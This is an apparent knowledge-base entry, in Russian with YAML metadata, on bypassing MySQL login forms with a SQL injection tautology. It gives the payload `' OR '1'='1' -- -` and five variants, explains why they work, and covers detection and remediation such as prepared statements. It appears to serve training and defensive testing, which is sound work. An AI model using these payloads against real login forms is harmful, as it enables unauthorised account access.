---
id: sqli-mysql-tautology-auth-bypass
title: "MySQL: обход аутентификации тавтологией"
type: sqli
target: mysql
category: web
difficulty: beginner
bypass: none
tags: [sqli, mysql, auth-bypass, tautology]
tested_on: ["MySQL 5.7", "MySQL 8.0", "MariaDB 10.6", "SQLite 3.40 (sqli-lab)"]
success_rate: 0.9
risk: low
cwe: "CWE-89"
lab: "labs/web-labs/sqli-lab"
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/SQL_Injection"
  - "https://portswigger.net/web-security/sql-injection"
graph:
  - target: "auth-bypass"
    type: leads_to
    description: "SQLi в форме логина даёт обход аутентификации"
  - target: "sqli"
    type: instance_of
---

# MySQL: обход аутентификации тавтологией

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
' OR '1'='1' -- -
```

## Explanation

Классическая тавтология. Приложение склеивает строку запроса вида
`SELECT * FROM users WHERE login='$login' AND password='$pass'`.
Подстановка закрывает строковый литерал, добавляет всегда истинное условие
и комментарием `-- -` отбрасывает хвост запроса (в MySQL после `--` обязателен пробел).
В результате условие `WHERE` истинно для первой строки таблицы — часто для администратора.

## Detection

1. Отправьте `'` в поле логина — ошибка синтаксиса СУБД в ответе/логах.
2. Сравните ответы на `' OR '1'='1` и `' OR '1'='2` — различие подтверждает инъекцию.
3. Признак: вход выполнен без знания пароля либо изменилось число строк в выдаче.

## Remediation

- Параметризованные запросы (prepared statements) — единственный надёжный способ.
- Минимальные привилегии учётки БД для приложения (без `FILE`, `SUPER`).
- ORM с параметризацией по умолчанию; запрет конкатенации строк в SQL.
- Хранение паролей через argon2id/bcrypt — обход `WHERE` не даст доступа к хешам.

## Variants

```
' OR 1=1 -- -
```

```
' OR 'a'='a
```

```
admin' -- -
```

```
' OR ''='
```

```
') OR ('1'='1
```
